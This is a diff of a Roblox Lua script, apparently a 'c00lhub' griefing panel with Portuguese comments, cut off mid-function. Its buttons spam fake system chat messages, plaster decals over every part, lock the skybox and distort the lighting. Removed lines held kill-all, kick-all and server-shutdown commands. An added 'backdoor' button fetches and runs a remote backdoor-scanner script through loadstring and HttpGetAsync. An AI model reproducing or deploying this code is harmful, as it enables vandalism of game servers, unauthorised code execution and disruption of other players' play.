@@ -1,196 +1,128 @@
+-- Gui to Lua
 -- Version: 3.2
 
 -- Instances:
 
-local MadeByenthony_50388 = Instance.new("ScreenGui")
+local C00lhubV1 = Instance.new("ScreenGui")
+local Open = Instance.new("TextButton")
+local FramePrincipal = Instance.new("Frame")
+local GuiInicial = Instance.new("Frame")
+local inicio = Instance.new("TextLabel")
+local asas = Instance.new("TextButton")
+local blocosCaindoDoCeu = Instance.new("TextButton")
+local nomeC00lkidd = Instance.new("TextButton")
+local guiEmSima = Instance.new("TextButton")
+local systemaDoChatAlerta = Instance.new("TextButton")
+local Musica = Instance.new("TextButton")
+local deletarHumanoids = Instance.new("TextButton")
+local fuderComALighting = Instance.new("TextButton")
+local decals = Instance.new("TextButton")
+local skybox = Instance.new("TextButton")
+local particulas = Instance.new("TextButton")
+local loopdiaenoite = Instance.new("TextButton")
+local GirarWorkspace = Instance.new("TextButton")
+local btools = Instance.new("TextButton")
+local InfinityYield = Instance.new("TextButton")
+local c00lkidd = Instance.new("Frame")
+local ImageLabel = Instance.new("ImageLabel")
+local fecharFrame = Instance.new("TextButton")
 local c00lhub = Instance.new("Frame")
-local made = Instance.new("TextLabel")
-local commands = Instance.new("Frame")
-local UIGradient = Instance.new("UIGradient")
-local UICorner = Instance.new("UICorner")
-local LoopKillAll = Instance.new("TextButton")
-local Particules = Instance.new("TextButton")
-local Shutdown = Instance.new("TextButton")
-local blocs = Instance.new("TextButton")
-local decalskybox = Instance.new("TextButton")
-local KickOthers = Instance.new("TextButton")
-local music = Instance.new("TextButton")
-local spin = Instance.new("TextButton")
-local terrorMod = Instance.new("TextButton")
-local jumscare = Instance.new("TextButton")
-local Destroy = Instance.new("TextButton")
-local Teleporteall = Instance.new("TextButton")
-local killAll = Instance.new("TextButton")
-local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
-local serversfuckeds = Instance.new("Frame")
-local serverFucked = Instance.new("TextButton")
-local horror = Instance.new("TextButton")
 local TextLabel = Instance.new("TextLabel")
+local TextLabel_2 = Instance.new("TextLabel")
 local UIDragDetector = Instance.new("UIDragDetector")
+local textureID = "rbxassetid://158118263"
+
 
 --Properties:
 
-MadeByenthony_50388.Name = "MadeByenthony_50388"
-MadeByenthony_50388.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-MadeByenthony_50388.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-MadeByenthony_50388.IgnoreGuiInset = true
+C00lhubV1.Name = "C00lhubV1"
+C00lhubV1.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+C00lhubV1.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+C00lhubV1.IgnoreGuiInset = true
+
+Open.Name = "Open"
+Open.Parent = C00lhubV1
+Open.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+Open.BorderColor3 = Color3.fromRGB(255, 255, 255)
+Open.Position = UDim2.new(0.0379857644, 0, 0.956521749, 0)
+Open.Size = UDim2.new(0, 151, 0, 41)
+Open.Font = Enum.Font.SourceSans
+Open.Text = "Abrir"
+Open.TextColor3 = Color3.fromRGB(255, 255, 255)
+Open.TextScaled = true
+Open.TextSize = 14.000
+Open.TextWrapped = true
+Open.MouseButton1Down:Connect(function()
+	FramePrincipal.Visible = true
+end)
 
 UIDragDetector.Name = "UIDragDetector"
-UIDragDetector.Parent = c00lhub
+UIDragDetector.Parent = FramePrincipal
 
-c00lhub.Name = "c00lhub"
-c00lhub.Parent = MadeByenthony_50388
-c00lhub.BackgroundColor3 = Color3.fromRGB(66, 66, 66)
-c00lhub.BorderColor3 = Color3.fromRGB(0, 0, 0)
-c00lhub.BorderSizePixel = 0
-c00lhub.Position = UDim2.new(0.704243183, 0, 0, 0)
-c00lhub.Size = UDim2.new(0, 467, 0, 943)
+FramePrincipal.Name = "FramePrincipal"
+FramePrincipal.Parent = C00lhubV1
+FramePrincipal.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+FramePrincipal.BorderColor3 = Color3.fromRGB(255, 255, 255)
+FramePrincipal.Position = UDim2.new(0.208993033, 0, 0.165429488, 0)
+FramePrincipal.Size = UDim2.new(0, 919, 0, 631)
+FramePrincipal.Visible = false
 
-made.Name = "made"
-made.Parent = c00lhub
-made.BackgroundColor3 = Color3.fromRGB(0, 0, 127)
-made.BorderColor3 = Color3.fromRGB(0, 0, 0)
-made.BorderSizePixel = 0
-made.Size = UDim2.new(0, 467, 0, 50)
-made.Text = "c00lhub Made by @enthony_50388"
-made.TextColor3 = Color3.fromRGB(255, 255, 255)
-made.TextScaled = true
-made.TextSize = 14.000
-made.TextWrapped = true
+GuiInicial.Name = "GuiInicial"
+GuiInicial.Parent = FramePrincipal
+GuiInicial.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
+GuiInicial.BorderColor3 = Color3.fromRGB(255, 255, 255)
+GuiInicial.Position = UDim2.new(0.0141458111, 0, 0.342960328, 0)
+GuiInicial.Size = UDim2.new(0, 892, 0, 399)
 
-commands.Name = "commands"
-commands.Parent = c00lhub
-commands.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
-commands.BorderColor3 = Color3.fromRGB(0, 0, 0)
-commands.BorderSizePixel = 0
-commands.Position = UDim2.new(0.049186755, 0, 0.078472957, 0)
-commands.Size = UDim2.new(0, 432, 0, 853)
+inicio.Name = "inicio"
+inicio.Parent = GuiInicial
+inicio.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+inicio.BorderColor3 = Color3.fromRGB(255, 255, 255)
+inicio.Position = UDim2.new(0.775784731, 0, 0, 0)
+inicio.Size = UDim2.new(0, 200, 0, 50)
+inicio.Font = Enum.Font.Unknown
+inicio.Text = "inicio"
+inicio.TextColor3 = Color3.fromRGB(255, 255, 255)
+inicio.TextScaled = true
+inicio.TextSize = 14.000
+inicio.TextWrapped = true
 
-UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 4)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(49, 0, 1))}
-UIGradient.Rotation = 25
-UIGradient.Parent = commands
-
-UICorner.Parent = commands
-
-LoopKillAll.Name = "LoopKillAll"
-LoopKillAll.Parent = commands
-LoopKillAll.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
-LoopKillAll.BorderColor3 = Color3.fromRGB(0, 0, 0)
-LoopKillAll.BorderSizePixel = 3
-LoopKillAll.Position = UDim2.new(0.650091648, 0, 0.809786379, 0)
-LoopKillAll.Size = UDim2.new(0, 113, 0, 106)
-LoopKillAll.Font = Enum.Font.Unknown
-LoopKillAll.Text = "Loop Kill All"
-LoopKillAll.TextColor3 = Color3.fromRGB(0, 0, 0)
-LoopKillAll.TextScaled = true
-LoopKillAll.TextSize = 14.000
-LoopKillAll.TextWrapped = true
-LoopKillAll.MouseButton1Down:Connect(function()
-	local Players = game:GetService("Players")
-
-	-- Função para matar um jogador
-	local function killPlayer(player)
-		if player.Character then
-			local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
-			if humanoid then
-				humanoid.Health = 0
-			end
-		end
-	end
-
-	-- Loop infinito para matar todos os jogadores
-	while true do
-		for _, player in ipairs(Players:GetPlayers()) do
-			killPlayer(player)
-		end
-		wait(0.5) -- Tempo entre cada execução (evita sobrecarga)
-	end
+asas.Name = "backdoor"
+asas.Parent = GuiInicial
+asas.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+asas.BorderColor3 = Color3.fromRGB(255, 255, 255)
+asas.Position = UDim2.new(0.0213004481, 0, 0.0401002504, 0)
+asas.Size = UDim2.new(0, 168, 0, 55)
+asas.Font = Enum.Font.Unknown
+asas.Text = "backdoor"
+asas.TextColor3 = Color3.fromRGB(255, 255, 255)
+asas.TextScaled = true
+asas.TextSize = 14.000
+asas.TextWrapped = true
+asas.MouseButton1Down:Connect(function()
+	loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/beckdeer-skenner/main/src/main.lua"))()
 end)
 
-Particules.Name = "Particules"
-Particules.Parent = commands
-Particules.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
-Particules.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Particules.BorderSizePixel = 3
-Particules.Position = UDim2.new(0.0376719721, 0, 0.0315201506, 0)
-Particules.Size = UDim2.new(0, 113, 0, 106)
-Particules.Font = Enum.Font.Unknown
-Particules.Text = "particules"
-Particules.TextColor3 = Color3.fromRGB(0, 0, 0)
-Particules.TextScaled = true
-Particules.TextSize = 14.000
-Particules.TextWrapped = true
-Particules.MouseButton1Down:Connect(function()
-	local function addParticlesToPart(part)
-		-- Verifica se a peça já tem um ParticleEmitter para evitar duplicação
-		if not part:FindFirstChild("ParticleEmitter") then
-			local particle = Instance.new("ParticleEmitter")
-			particle.Texture = "rbxassetid://178993746" -- ID da textura da partícula (substitua se quiser)
-			particle.Rate = 10 -- Quantidade de partículas emitidas por segundo
-			particle.Lifetime = NumberRange.new(1, 2) -- Tempo de vida das partículas
-			particle.Speed = NumberRange.new(2, 5) -- Velocidade das partículas
-			particle.Parent = part -- Adiciona o emissor à peça
-			particle.Enabled = true
-		end
-	end
-
-	-- Percorre todos os objetos no jogo e adiciona partículas às Parts
-	for _, obj in pairs(workspace:GetDescendants()) do
-		if obj:IsA("Part") then
-			addParticlesToPart(obj)
-		end
-	end
-
-	print("ParticleEmitter adicionado a todas as Parts!")
-
-end)
-
-Shutdown.Name = "Shutdown"
-Shutdown.Parent = commands
-Shutdown.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
-Shutdown.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Shutdown.BorderSizePixel = 3
-Shutdown.Position = UDim2.new(0.0376719721, 0, 0.601723492, 0)
-Shutdown.Size = UDim2.new(0, 399, 0, 106)
-Shutdown.Font = Enum.Font.Unknown
-Shutdown.Text = "Shutdown"
-Shutdown.TextColor3 = Color3.fromRGB(0, 0, 0)
-Shutdown.TextScaled = true
-Shutdown.TextSize = 14.000
-Shutdown.TextWrapped = true
-Shutdown.MouseButton1Down:Connect(function()
-	local Players = game:GetService("Players")
-
-	-- Mensagem antes do shutdown (opcional)
-	for _, player in ipairs(Players:GetPlayers()) do
-		player:Kick("🚨 O servidor foi destruido pelo c00lkidd!")
-	end
-
-	-- Desliga o servidor
-	game:Shutdown()
-end)
-
-blocs.Name = "blocs"
-blocs.Parent = commands
-blocs.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
-blocs.BorderColor3 = Color3.fromRGB(0, 0, 0)
-blocs.BorderSizePixel = 3
-blocs.Position = UDim2.new(0.0376719721, 0, 0.395444185, 0)
-blocs.Size = UDim2.new(0, 113, 0, 106)
-blocs.Font = Enum.Font.Unknown
-blocs.Text = "blocks"
-blocs.TextColor3 = Color3.fromRGB(0, 0, 0)
-blocs.TextScaled = true
-blocs.TextSize = 14.000
-blocs.TextWrapped = true
-blocs.MouseButton1Down:Connect(function()
+blocosCaindoDoCeu.Name = "blocosCaindoDoCeu"
+blocosCaindoDoCeu.Parent = GuiInicial
+blocosCaindoDoCeu.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+blocosCaindoDoCeu.BorderColor3 = Color3.fromRGB(255, 255, 255)
+blocosCaindoDoCeu.Position = UDim2.new(0.0213004481, 0, 0.26566416, 0)
+blocosCaindoDoCeu.Size = UDim2.new(0, 168, 0, 55)
+blocosCaindoDoCeu.Font = Enum.Font.Unknown
+blocosCaindoDoCeu.Text = "blocos caindo do céu"
+blocosCaindoDoCeu.TextColor3 = Color3.fromRGB(255, 255, 255)
+blocosCaindoDoCeu.TextScaled = true
+blocosCaindoDoCeu.TextSize = 14.000
+blocosCaindoDoCeu.TextWrapped = true
+blocosCaindoDoCeu.MouseButton1Down:Connect(function()
 	local spawnHeight = 1000  -- Altura onde os blocos aparecem
 	local fallInterval = 0.5    -- Intervalo entre cada bloco cair (segundos)
 	local spawnRange = 1000     -- Distância horizontal máxima para spawn
 	local despawnTime = 5    -- Tempo até os blocos desaparecerem (segundos)
 
 	function spawnBlock()
-		local sizeFactor = math.random(200, 200, 200) -- Aumenta o tamanho geral dos blocos
+		local sizeFactor = math.random(10, 20) -- Aumenta o tamanho geral dos blocos
 		local block = Instance.new("Part")  
 		block.Size = Vector3.new(sizeFactor, sizeFactor, sizeFactor) -- Agora os blocos são maiores
 		block.Position = Vector3.new(math.random(-spawnRange, spawnRange), spawnHeight, math.random(-spawnRange, spawnRange))
@@ -214,110 +146,135 @@ blocs.MouseButton1Down:Connect(function()
 	end
 end)
 
-decalskybox.Name = "decal/skybox"
-decalskybox.Parent = commands
-decalskybox.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
-decalskybox.BorderColor3 = Color3.fromRGB(0, 0, 0)
-decalskybox.BorderSizePixel = 3
-decalskybox.Position = UDim2.new(0.34364602, 0, 0.0315201506, 0)
-decalskybox.Size = UDim2.new(0, 113, 0, 106)
-decalskybox.Font = Enum.Font.Unknown
-decalskybox.Text = "decal and skybox"
-decalskybox.TextColor3 = Color3.fromRGB(0, 0, 0)
-decalskybox.TextScaled = true
-decalskybox.TextSize = 14.000
-decalskybox.TextWrapped = true
-decalskybox.MouseButton1Down:Connect(function()
-	local lighting = game:GetService("Lighting")
-	local workspace = game:GetService("Workspace")
-
-	-- ID da textura para Skybox e Decals
-	local textureID = "rbxassetid://158118263"
-
-	-- 🟢 Função para alterar a textura da Skybox e impedir mudanças
-	local function changeSkyboxTexture()
-		local skybox = lighting:FindFirstChildOfClass("Sky")
-
-		if not skybox then
-			skybox = Instance.new("Sky")
-			skybox.Name = "CustomSkybox"
-			skybox.Parent = lighting
-		end
-
-		-- Aplica a textura em todas as direções da Skybox
-		for _, property in pairs({ "SkyboxBk", "SkyboxDn", "SkyboxFt", "SkyboxLf", "SkyboxRt", "SkyboxUp" }) do
-			skybox[property] = textureID
-			skybox:GetPropertyChangedSignal(property):Connect(function()
-				skybox[property] = textureID
-			end)
-		end
-	end
-
-	-- 🟢 Função para adicionar Decal a qualquer objeto
-	local function applyDecalToObject(object)
-		-- Apenas adiciona Decal se o objeto puder receber uma
-		if not object:IsA("Terrain") and not object:FindFirstChildOfClass("Decal") then
-			local decal = Instance.new("Decal")
-			decal.Texture = textureID
-			decal.Face = Enum.NormalId.Front  -- Define a face (pode alterar para outras direções)
-			decal.Parent = object
-		end
-	end
-
-	-- 🟢 Aplica decals a tudo que já existe no Workspace
-	for _, obj in pairs(workspace:GetDescendants()) do
-		applyDecalToObject(obj)
-	end
-
-	-- 🟢 Garante que qualquer novo objeto que for adicionado ao Workspace também receba um Decal
-	workspace.DescendantAdded:Connect(applyDecalToObject)
-
-	-- Chama a função para mudar a Skybox
-	changeSkyboxTexture()
-
-	print("✅ Skybox alterada e Decals aplicados a TODOS os objetos no Workspace!")
-end)
-
-KickOthers.Name = "Kick Others"
-KickOthers.Parent = commands
-KickOthers.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
-KickOthers.BorderColor3 = Color3.fromRGB(0, 0, 0)
-KickOthers.BorderSizePixel = 3
-KickOthers.Position = UDim2.new(0.343881667, 0, 0.809786379, 0)
-KickOthers.Size = UDim2.new(0, 113, 0, 106)
-KickOthers.Font = Enum.Font.Unknown
-KickOthers.Text = "Kick Others"
-KickOthers.TextColor3 = Color3.fromRGB(0, 0, 0)
-KickOthers.TextScaled = true
-KickOthers.TextSize = 14.000
-KickOthers.TextWrapped = true
-KickOthers.MouseButton1Down:Connect(function()
+nomeC00lkidd.Name = "nomeC00lkidd"
+nomeC00lkidd.Parent = GuiInicial
+nomeC00lkidd.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+nomeC00lkidd.BorderColor3 = Color3.fromRGB(255, 255, 255)
+nomeC00lkidd.Position = UDim2.new(0.0213004481, 0, 0.501253128, 0)
+nomeC00lkidd.Size = UDim2.new(0, 168, 0, 55)
+nomeC00lkidd.Font = Enum.Font.Unknown
+nomeC00lkidd.Text = "nome: c00lkidd"
+nomeC00lkidd.TextColor3 = Color3.fromRGB(255, 255, 255)
+nomeC00lkidd.TextScaled = true
+nomeC00lkidd.TextSize = 14.000
+nomeC00lkidd.TextWrapped = true
+nomeC00lkidd.MouseButton1Down:Connect(function()
 	local Players = game:GetService("Players")
-	local owner = Players.LocalPlayer -- Quem executou o script
 
-	for _, player in ipairs(Players:GetPlayers()) do
-		if player ~= owner then
-			player:Kick("🚨 Kitado pelo time c00lkidd! lol")
-		end
+	-- Nome personalizado para ser exibido acima da cabeça
+	local customName = "c00lkidd"
+
+	-- Função para mudar o nome acima da cabeça de um jogador
+	local function changeNameTag(player)
+		-- Aguarda até o personagem do jogador ser carregado
+		player.CharacterAdded:Connect(function(character)
+			-- Aguarda a cabeça do personagem ser carregada
+			local head = character:WaitForChild("Head")
+			-- Verifica se o humanoide já tem a propriedade "DisplayName"
+			local humanoid = character:WaitForChild("Humanoid")
+			humanoid.DisplayName = customName
+		end)
 	end
+
+	-- Muda o nome dos jogadores já presentes no jogo
+	for _, player in pairs(Players:GetPlayers()) do
+		changeNameTag(player)
+	end
+
+	-- Muda o nome dos jogadores que entrarem no jogo
+	Players.PlayerAdded:Connect(changeNameTag)
 end)
 
-music.Name = "music"
-music.Parent = commands
-music.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
-music.BorderColor3 = Color3.fromRGB(0, 0, 0)
-music.BorderSizePixel = 3
-music.Position = UDim2.new(0.34364602, 0, 0.210748315, 0)
-music.Size = UDim2.new(0, 113, 0, 106)
-music.Font = Enum.Font.Unknown
-music.Text = "music"
-music.TextColor3 = Color3.fromRGB(0, 0, 0)
-music.TextScaled = true
-music.TextSize = 14.000
-music.TextWrapped = true
-music.MouseButton1Down:Connect(function()
-	local soundId = "rbxassetid://142376088" -- ID da música oficial
-	local volume = 2 -- Volume da música
+guiEmSima.Name = "guiEmSima"
+guiEmSima.Parent = GuiInicial
+guiEmSima.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+guiEmSima.BorderColor3 = Color3.fromRGB(255, 255, 255)
+guiEmSima.Position = UDim2.new(0.0213004481, 0, 0.724310756, 0)
+guiEmSima.Size = UDim2.new(0, 168, 0, 55)
+guiEmSima.Font = Enum.Font.Unknown
+guiEmSima.Text = "pedido para entrar no time c00lkidd"
+guiEmSima.TextColor3 = Color3.fromRGB(255, 255, 255)
+guiEmSima.TextScaled = true
+guiEmSima.TextSize = 14.000
+guiEmSima.TextWrapped = true
+guiEmSima.MouseButton1Down:Connect(function()
+	-- Gui to Lua
+	-- Version: 3.2
+
+	-- Instances:
+
+	local ScreenGui = Instance.new("ScreenGui")
+	local TextLabel = Instance.new("TextLabel")
+
+	--Properties:
+
+	ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+	ScreenGui.IgnoreGuiInset = true
+	
+	TextLabel.Parent = ScreenGui
+	TextLabel.BackgroundColor3 = Color3.fromRGB(57, 57, 57)
+	TextLabel.BackgroundTransparency = 0.300
+	TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	TextLabel.BorderSizePixel = 0
+	TextLabel.Size = UDim2.new(0, 1563, 0, 22)
+	TextLabel.Font = Enum.Font.SourceSans
+	TextLabel.Text = "team c00lkidd join today!"
+	TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+	TextLabel.TextSize = 14.000
+end)
+
+systemaDoChatAlerta.Name = "systemaDoChatAlerta"
+systemaDoChatAlerta.Parent = GuiInicial
+systemaDoChatAlerta.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+systemaDoChatAlerta.BorderColor3 = Color3.fromRGB(255, 255, 255)
+systemaDoChatAlerta.Position = UDim2.new(0.256726444, 0, 0.724310756, 0)
+systemaDoChatAlerta.Size = UDim2.new(0, 168, 0, 55)
+systemaDoChatAlerta.Font = Enum.Font.Unknown
+systemaDoChatAlerta.Text = "alerta no chat"
+systemaDoChatAlerta.TextColor3 = Color3.fromRGB(255, 255, 255)
+systemaDoChatAlerta.TextScaled = true
+systemaDoChatAlerta.TextSize = 14.000
+systemaDoChatAlerta.TextWrapped = true
+systemaDoChatAlerta.MouseButton1Down:Connect(function()
+	local TextChatService = game:GetService("TextChatService") -- Correção do serviço
+	local prefix = "[c00lkidd system] "
+
+	local function spamMessages()
+		while true do
+			wait(0.1)
+
+			-- Primeira mensagem
+			local message = "team c00lkidd join today!"
+			TextChatService.TextChannels.RBXGeneral:DisplaySystemMessage(prefix..message)
+
+			wait(0.1)
+
+			-- Segunda mensagem
+			message = "team c00lkidd i'm back!"
+			TextChatService.TextChannels.RBXGeneral:DisplaySystemMessage(prefix..message)
+		end
+	end
+
+	-- Inicia o spam de mensagens
+	spamMessages()
+end)
+
+Musica.Name = "Musica"
+Musica.Parent = GuiInicial
+Musica.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+Musica.BorderColor3 = Color3.fromRGB(255, 255, 255)
+Musica.Position = UDim2.new(0.256726444, 0, 0.501253128, 0)
+Musica.Size = UDim2.new(0, 168, 0, 55)
+Musica.Font = Enum.Font.Unknown
+Musica.Text = "musica"
+Musica.TextColor3 = Color3.fromRGB(255, 255, 255)
+Musica.TextScaled = true
+Musica.TextSize = 14.000
+Musica.TextWrapped = true
+Musica.MouseButton1Down:Connect(function()
+	local soundId = "rbxassetid://1839246711" -- ID da música oficial
+	local volume = 1 -- Volume da música
 
 	-- Função para remover todas as músicas não autorizadas
 	local function removeExistingMusic()
@@ -374,20 +331,241 @@ music.MouseButton1Down:Connect(function()
 	print("Proteção de música ativada! Hackers não poderão trocar a música.")
 end)
 
-spin.Name = "spin"
-spin.Parent = commands
-spin.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
-spin.BorderColor3 = Color3.fromRGB(0, 0, 0)
-spin.BorderSizePixel = 3
-spin.Position = UDim2.new(0.344952047, 0, 0.395444185, 0)
-spin.Size = UDim2.new(0, 113, 0, 106)
-spin.Font = Enum.Font.Unknown
-spin.Text = "spin workspace"
-spin.TextColor3 = Color3.fromRGB(0, 0, 0)
-spin.TextScaled = true
-spin.TextSize = 14.000
-spin.TextWrapped = true
-spin.MouseButton1Down:Connect(function()
+deletarHumanoids.Name = "deletarHumanoids"
+deletarHumanoids.Parent = GuiInicial
+deletarHumanoids.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+deletarHumanoids.BorderColor3 = Color3.fromRGB(255, 255, 255)
+deletarHumanoids.Position = UDim2.new(0.256726444, 0, 0.26566416, 0)
+deletarHumanoids.Size = UDim2.new(0, 168, 0, 55)
+deletarHumanoids.Font = Enum.Font.Unknown
+deletarHumanoids.Text = "deletar humanoid"
+deletarHumanoids.TextColor3 = Color3.fromRGB(255, 255, 255)
+deletarHumanoids.TextScaled = true
+deletarHumanoids.TextSize = 14.000
+deletarHumanoids.TextWrapped = true
+
+fuderComALighting.Name = "fuderComALighting"
+fuderComALighting.Parent = GuiInicial
+fuderComALighting.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+fuderComALighting.BorderColor3 = Color3.fromRGB(255, 255, 255)
+fuderComALighting.Position = UDim2.new(0.256726444, 0, 0.0401002504, 0)
+fuderComALighting.Size = UDim2.new(0, 168, 0, 55)
+fuderComALighting.Font = Enum.Font.Unknown
+fuderComALighting.Text = "fuder com a lighting"
+fuderComALighting.TextColor3 = Color3.fromRGB(255, 255, 255)
+fuderComALighting.TextScaled = true
+fuderComALighting.TextSize = 14.000
+fuderComALighting.TextWrapped = true
+fuderComALighting.MouseButton1Down:Connect(function()
+	local Lighting = game:GetService("Lighting")
+
+	-- Função para simular a visão daltônica
+	local function setDaltonicMode()
+		-- Criando o efeito de ColorCorrection
+		local colorCorrection = Instance.new("ColorCorrectionEffect")
+		local colorCorrection2 = Instance.new("ColorCorrectionEffect")
+		colorCorrection.Enabled = true
+
+		-- Alterando as cores para simular um tipo de daltonismo
+		-- Essa combinação é apenas um exemplo e pode ser ajustada conforme necessário
+		colorCorrection.TintColor = Color3.fromRGB(255, 0, 0) -- Colocando um tom amarelado
+		colorCorrection.Saturation = -0.7  -- Reduzindo bastante a saturação para uma visão mais apagada
+		colorCorrection.Contrast =  100000002004087734272    -- Aumentando o contraste para intensificar a diferença nas cores
+		colorCorrection.Brightness = 0.1   -- Aumentando o brilho para deixar a cena mais iluminada
+		colorCorrection2.TintColor = Color3.fromRGB(255, 0, 4) -- Colocando um tom amarelado
+		colorCorrection2.Saturation = -0.1  -- Reduzindo bastante a saturação para uma visão mais apagada
+		colorCorrection2.Contrast =  100000002004087734272    -- Aumentando o contraste para intensificar a diferença nas cores
+		colorCorrection2.Brightness = 0.1 
+
+		-- Aplica o efeito de daltonismo no serviço de iluminação
+		colorCorrection.Parent = Lighting
+		colorCorrection2.Parent = Lighting
+	end
+
+	-- Chamando as funções
+	setDaltonicMode()
+end)
+
+decals.Name = "decals"
+decals.Parent = GuiInicial
+decals.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+decals.BorderColor3 = Color3.fromRGB(255, 255, 255)
+decals.Position = UDim2.new(0.492152452, 0, 0.0401002504, 0)
+decals.Size = UDim2.new(0, 168, 0, 55)
+decals.Font = Enum.Font.Unknown
+decals.Text = "decals"
+decals.TextColor3 = Color3.fromRGB(255, 255, 255)
+decals.TextScaled = true
+decals.TextSize = 14.000
+decals.TextWrapped = true
+decals.MouseButton1Down:Connect(function()
+	local workspace = game:GetService("Workspace")
+
+	-- 🟢 Função para adicionar Decals em todas as faces de um objeto
+	local function applyDecalsToObject(object)
+		-- Apenas adiciona Decals se for uma Part e não tiver Decals ainda
+		if object:IsA("Part") or object:IsA("MeshPart") then
+			for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
+				-- Verifica se já existe um Decal na face antes de adicionar
+				local hasDecal = false
+				for _, child in ipairs(object:GetChildren()) do
+					if child:IsA("Decal") and child.Face == face then
+						hasDecal = true
+						break
+					end
+				end
+
+				-- Se não tiver Decal na face, adiciona
+				if not hasDecal then
+					local decal = Instance.new("Decal")
+					decal.Texture = textureID
+					decal.Face = face
+					decal.Parent = object
+				end
+			end
+		end
+	end
+
+	-- 🟢 Aplica decals a todas as Parts já existentes no Workspace
+	for _, obj in pairs(workspace:GetDescendants()) do
+		applyDecalsToObject(obj)
+	end
+
+	-- 🟢 Aplica decals a qualquer nova Part adicionada no Workspace
+	workspace.DescendantAdded:Connect(function(obj)
+		applyDecalsToObject(obj)
+	end)
+end)
+
+skybox.Name = "skybox"
+skybox.Parent = GuiInicial
+skybox.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+skybox.BorderColor3 = Color3.fromRGB(255, 255, 255)
+skybox.Position = UDim2.new(0.492152452, 0, 0.26566416, 0)
+skybox.Size = UDim2.new(0, 168, 0, 55)
+skybox.Font = Enum.Font.Unknown
+skybox.Text = "skybox"
+skybox.TextColor3 = Color3.fromRGB(255, 255, 255)
+skybox.TextScaled = true
+skybox.TextSize = 14.000
+skybox.TextWrapped = true
+skybox.MouseButton1Down:Connect(function()
+	local lighting = game:GetService("Lighting")
+	
+	local function changeSkyboxTexture()
+		local skybox = lighting:FindFirstChildOfClass("Sky")
+
+		if not skybox then
+			skybox = Instance.new("Sky")
+			skybox.Name = "CustomSkybox"
+			skybox.Parent = lighting
+		end
+
+		-- Aplica a textura em todas as direções da Skybox
+		for _, property in pairs({ "SkyboxBk", "SkyboxDn", "SkyboxFt", "SkyboxLf", "SkyboxRt", "SkyboxUp" }) do
+			skybox[property] = textureID
+			skybox:GetPropertyChangedSignal(property):Connect(function()
+				skybox[property] = textureID
+			end)
+		end
+	end
+	
+	changeSkyboxTexture()
+end)
+
+particulas.Name = "particulas"
+particulas.Parent = GuiInicial
+particulas.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+particulas.BorderColor3 = Color3.fromRGB(255, 255, 255)
+particulas.Position = UDim2.new(0.492152452, 0, 0.501253128, 0)
+particulas.Size = UDim2.new(0, 168, 0, 55)
+particulas.Font = Enum.Font.Unknown
+particulas.Text = "particulas"
+particulas.TextColor3 = Color3.fromRGB(255, 255, 255)
+particulas.TextScaled = true
+particulas.TextSize = 14.000
+particulas.TextWrapped = true
+particulas.MouseButton1Down:Connect(function()
+	local function addParticlesToPart(part)
+		-- Verifica se a peça já tem um ParticleEmitter para evitar duplicação
+		if not part:FindFirstChild("ParticleEmitter") then
+			local particle = Instance.new("ParticleEmitter")
+			particle.Texture = "rbxassetid://178993746" -- ID da textura da partícula (substitua se quiser)
+			particle.Rate = 10 -- Quantidade de partículas emitidas por segundo
+			particle.Lifetime = NumberRange.new(1, 2) -- Tempo de vida das partículas
+			particle.Speed = NumberRange.new(2, 5) -- Velocidade das partículas
+			particle.Parent = part -- Adiciona o emissor à peça
+			particle.Enabled = true
+		end
+	end
+
+	-- Percorre todos os objetos no jogo e adiciona partículas às Parts
+	for _, obj in pairs(workspace:GetDescendants()) do
+		if obj:IsA("Part") then
+			addParticlesToPart(obj)
+		end
+	end
+
+	print("ParticleEmitter adicionado a todas as Parts!")
+end)
+
+loopdiaenoite.Name = "loopdiaenoite"
+loopdiaenoite.Parent = GuiInicial
+loopdiaenoite.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+loopdiaenoite.BorderColor3 = Color3.fromRGB(255, 255, 255)
+loopdiaenoite.Position = UDim2.new(0.492152452, 0, 0.724310756, 0)
+loopdiaenoite.Size = UDim2.new(0, 168, 0, 55)
+loopdiaenoite.Font = Enum.Font.Unknown
+loopdiaenoite.Text = "dia e noite"
+loopdiaenoite.TextColor3 = Color3.fromRGB(255, 255, 255)
+loopdiaenoite.TextScaled = true
+loopdiaenoite.TextSize = 14.000
+loopdiaenoite.TextWrapped = true
+loopdiaenoite.MouseButton1Down:Connect(function()
